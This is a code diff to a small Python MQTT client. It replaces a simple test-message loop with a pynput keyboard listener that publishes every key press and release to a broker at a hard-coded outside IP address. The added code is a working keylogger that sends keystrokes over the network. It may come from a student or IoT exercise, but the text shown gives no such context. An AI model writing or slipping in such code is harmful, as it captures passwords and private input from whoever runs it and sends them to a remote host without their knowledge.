@@ -1,6 +1,9 @@
 import paho.mqtt.client as mqtt
 import time
 
+from pynput.keyboard import Key, Listener
+
+
 broker = "143.215.102.14"
 port = 1883
 topic = "test"
@@ -17,14 +20,32 @@ def on_connect(client, userdata, rc):
 def on_message(client, userdata, msg):
     print(msg.topic+" "+str(msg.payload))
 
+
 client = mqtt.Client()
 client.on_connect = on_connect
 client.on_message = on_message
 client.connect(broker, port)
 
-for i in range(0,10):
-    client.publish(topic,"Boo Back")
-    time.sleep(1)
+def on_press(key):
+    output = ('{0} pressed'.format(
+        key))
+    client.publish(topic,output)
+
+def on_release(key):
+    output = ('{0} release'.format(
+        key))
+    client.publish(topic,output)
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
+
+
 
 # Blocking call that processes network traffic, dispatches callbacks and
 # handles reconnecting.
